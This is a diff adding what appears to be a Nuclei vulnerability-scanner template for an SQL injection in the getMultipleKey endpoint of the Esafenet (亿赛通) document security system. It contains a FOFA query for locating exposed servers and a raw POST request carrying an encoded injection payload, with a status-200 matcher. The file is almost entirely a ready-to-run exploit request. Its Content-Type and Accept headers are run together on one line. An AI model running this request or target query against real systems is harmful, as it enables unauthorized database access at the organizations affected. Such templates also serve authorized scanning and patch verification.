@@ -1,0 +1,32 @@
+id: poc-gb4y0r3vkemy9gf9
+info:
+  name: 亿赛通电子文档安全管理系统 getMultiplekey存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gb4y0r3vkemy9gf9'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gb4y0r3vkemy9gf9
+    fofa: body="/CDGServer3/index.jsp" && title!="DLP"
+http:
+- raw:
+  - 'POST /CDGServer3/security/getMultipleKey HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
+
+    Content-Type: application/octet-streamAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 241
+
+    Connection: close
+
+
+    HKMDJCFOBFCGPDHKKCFNLGDDJNCCAJAFEGAPMMPOPPFMELPHAOFBNECCBEEEGHBLJLJHIIHIDNMIKMLKNOIPDICIMGHPPIELFHAMPNEPJPDOILJFILKJIKGBKDMPJHEEDAFMFNDBGAGAFNDLFMGPCD'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
